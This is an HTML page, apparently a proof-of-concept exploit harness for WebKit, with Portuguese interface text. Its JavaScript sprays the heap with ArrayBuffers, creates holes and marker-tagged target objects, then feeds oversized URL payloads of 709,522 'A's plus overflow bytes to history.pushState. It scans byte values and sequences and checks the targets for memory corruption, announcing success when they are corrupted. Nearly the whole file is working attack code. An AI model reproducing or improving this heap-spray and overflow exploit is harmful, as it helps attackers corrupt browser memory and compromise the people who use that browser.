
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit Byte-Range Exploitation (ISOLADO)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.2em; cursor: pointer; 
            background: #111; color: #fff; border: 1px solid #0f0; margin: 10px 0; width: 100%;
        }
        .btn:hover { background: #222; }
        .input-group { margin: 10px 0; border: 1px solid #333; padding: 10px; }
        label { margin-right: 10px; }
        input { background: #222; color: #fff; border: 1px solid #555; padding: 5px; }
    </style>
</head>
<body>

<h1>REPLICAÇÃO EXATA (6 -> 3 -> 1)</h1>

<div class="input-group">
    <h3>PASSO 1: Teste 6 (Incremental)</h3>
    <label>Start:</label>
    <input type="number" id="t6start" value="1000" min="100" max="50000">
    <label>Step:</label>
    <input type="number" id="t6step" value="5000" min="100" max="10000">
    <button class="btn" onclick="test6_Incremental()">Executar Teste 6</button>
</div>

<div class="input-group">
    <h3>PASSO 2: Teste 3 (Sequências)</h3>
    <button class="btn" onclick="test3_SpecialSequences()">Executar Teste 3</button>
</div>

<div class="input-group">
    <h3>PASSO 3: Teste 1 (O Gatilho)</h3>
    <p style="color:red">Atenção: Ao rodar este teste após os anteriores, aguarde o aviso de memória e clique em CANCELAR.</p>
    <button class="btn" onclick="test1_MapBytes()" style="border-color: red; color: red;">Executar Teste 1</button>
</div>

<button onclick="clearLog()" style="margin-top:20px">Limpar Log</button>

<div id="log"></div>

<script>
// ===================================================================
// CONSTANTES (DO SEU CÓDIGO)
// ===================================================================
const BASE_SAFE = 709522;
const OVERFLOW_START = 709523;

// Objetos de controle
let heapObjects = [];
let targetObjects = [];

// ===================================================================
// LOGGING
// ===================================================================
function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    log('Log limpo');
}

// ===================================================================
// PREPARAÇÃO DE HEAP (DO SEU CÓDIGO)
// ===================================================================
function prepareHeap() {
    log('Preparando heap...');
    
    heapObjects = [];
    targetObjects = [];
    
    // Spray
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    
    // Holes
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    // Alvos
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            buf: buf,
            view: view
        });
    }
    
    log('Heap preparado: 500 spray + 50 alvos');
}

function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            if (t.magic !== 0xCAFEBABE) {
                log(`CORRUPTED alvo ${i}: magic=0x${t.magic.toString(16)}`);
                corrupted++;
            }
            if (t.view[0] !== 0xDEADBEEF) {
                log(`CORRUPTED alvo ${i}: buffer=0x${t.view[0].toString(16)}`);
                corrupted++;
            }
        } catch (e) {
            log(`DESTROYED alvo ${i}`);
            corrupted++;
        }
    }
    return corrupted;
}

// ===================================================================
// TESTE 6: EXPLORAÇÃO INCREMENTAL (SEU CÓDIGO INTACTO)
// ===================================================================
async function test6_Incremental() {
    log('================================');
    log('TESTE 6: EXPLORAÇÃO INCREMENTAL');
    log('================================');
    
    prepareHeap();
    
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    
    log(`Começando em ${start} bytes, incremento de ${step}`);
    
    let currentSize = start;
    let maxSuccess = 0;
    
    for (let i = 0; i < 10; i++) {
        log('');
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            // Overflow usando apenas bytes válidos (Lógica j % 33)
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, `inc_${currentSize}`, payload);
            
            log(`SUCESSO com ${currentSize} bytes`);
            maxSuccess = currentSize;
            
            currentSize += step;
            
            await new Promise(r => setTimeout(r, 1500));
            
        } catch (e) {
            log(`CRASH em ${currentSize} bytes: ${e.message}`);
            break;
        }
    }
    
    log('');
    log('=== RESULTADO ===');
    log(`Tamanho máximo sem crash: ${maxSuccess} bytes`);
    
    setTimeout(() => {
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`EXPLORAÇÃO SUCESSO! ${corrupted} alvos corrompidos`);
        }
    }, 1000);
}

// ===================================================================
// TESTE 3: SEQUÊNCIAS ESPECIAIS (SEU CÓDIGO INTACTO)
// ===================================================================
function test3_SpecialSequences() {
    log('================================');
    log('TESTE 3: SEQUÊNCIAS ESPECIAIS');
    log('================================');
    
    prepareHeap();
    
    // Sequências com significado especial
    const sequences = [
        { name: "Null-terminated", bytes: [0x00, 0x00, 0x00, 0x00] },
        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
        { name: "Carriage Return", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
        { name: "Mixed Control", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
        { name: "ASCII Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
        { name: "Bell/Backspace", bytes: [0x07, 0x08, 0x08, 0x07] }
    ];
    
    for (let seq of sequences) {
        log('');
        log(`Testando: ${seq.name}`);
        log(`Bytes: [${seq.bytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            // Repetir sequência 1000 vezes
            let overflow = "";
            for (let i = 0; i < 1000; i++) {
                for (let byte of seq.bytes) {
                    overflow += String.fromCharCode(byte);
                }
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, seq.name.replace(/\s/g, '_'), payload);
            
            log(`SUCESSO: ${seq.name} executado`);
            
        } catch (e) {
            log(`CRASH: ${seq.name} - ${e.message}`);
        }
    }
    
    setTimeout(() => {
        log('');
        log('Verificando corrupção...');
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`RESULTADO: ${corrupted} alvos corrompidos por sequências especiais`);
        }
    }, 2000);
}

// ===================================================================
// TESTE 1: MAPEAR BYTES PERMITIDOS (SEU CÓDIGO INTACTO)
// ===================================================================
function test1_MapBytes() {
    log('================================');
    log('TESTE 1: MAPEAMENTO DE BYTES');
    log('================================');
    
    prepareHeap();
    
    log('Testando cada byte de 0x00 a 0xFF...');
    
    const allowedBytes = [];
    const crashBytes = [];
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            
            allowedBytes.push(byte);
            
            if (byte % 16 === 0) {
                log(`Testando 0x${byte.toString(16).padStart(2, '0')}... OK`);
            }
            
        } catch (e) {
            crashBytes.push(byte);
            log(`CRASH em 0x${byte.toString(16).padStart(2, '0')}: ${e.message}`);
        }
    }
    
    log('');
    log('=== RESULTADO ===');
    log(`Bytes permitidos: ${allowedBytes.length}`);
    if (allowedBytes.length > 0) {
        log(`Range: 0x${Math.min(...allowedBytes).toString(16)} - 0x${Math.max(...allowedBytes).toString(16)}`);
        log(`Lista: [${allowedBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
    }
    log('');
    log(`Bytes que crasham: ${crashBytes.length}`);
    if (crashBytes.length < 50) {
        log(`Lista: [${crashBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
    }
}
</script>

</body>
</html>
